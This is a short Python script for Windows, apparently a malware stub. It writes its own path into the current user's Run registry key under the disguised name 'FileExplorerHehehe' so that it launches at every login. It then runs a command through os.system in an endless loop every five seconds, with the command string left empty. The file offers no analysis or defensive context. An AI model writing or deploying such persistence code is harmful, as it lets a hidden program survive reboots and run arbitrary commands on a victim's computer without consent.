import winreg as wrg
import sys, time, os
a = wrg.OpenKeyEx(wrg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", 0, wrg.KEY_ALL_ACCESS)
b = wrg.SetValueEx(a, "FileExplorerHehehe", 0, wrg.REG_SZ, sys.argv[0])
while True:
    cmd = """"""
    os.system(cmd)
    time.sleep(5)